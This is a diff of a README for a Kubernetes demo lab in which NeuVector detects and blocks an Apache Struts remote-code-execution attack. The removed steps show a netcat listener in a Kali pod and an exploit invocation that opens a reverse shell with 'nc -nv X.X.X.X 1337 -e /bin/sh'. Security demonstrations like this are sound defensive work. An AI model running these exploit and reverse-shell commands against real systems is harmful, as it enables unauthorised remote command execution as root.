@@ -45,20 +45,3 @@ sh struts1.sh
 notice how the orders workload connects to the reversed shell and execute some commands there, like `whoami` `ls -l`, etc...
 
 8. Look in the Neuvector security events how Neuvector now warns about different violations on the security policy, each warning is one layer of protection so even if this was a zero day the other warnings would block the attempt in protect mode.
-
-5. open a terminal and create a reverse shell in the kali pod
-```
-kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range .items}}{{.metadata.name}}{{\"\n\"}}{{end}}") -- nc -lvp 1337
-```
-
-6. open another terminal and execute the RCE payload in the kali workload
-```
-kubectl exec -it $(kubectl get pods --selector=app=kali-kali --template "{{range .items}}{{.metadata.name}}{{\"\n\"}}{{end}}") -- bash
-python3 /payloads/struts-pwn2.py --exploit --url 'http://URL/super-app/orders/3' -c 'nc -nv X.X.X.X 1337 -e /bin/sh'
-```
-where `X.X.X.X` is the IP to the kali service you got in step 4
-and the URL is the HOSTS of struts-orders ingress `kubectl get ingress struts-orders`
-
-7. In the reverse shell type some commands, like prove you are root with `whoami`
-
-8. Put the policy group `nv.struts-orders.default` in protect mode and see that it is now protected and it's no longer possible to execute commands in the reversed shell
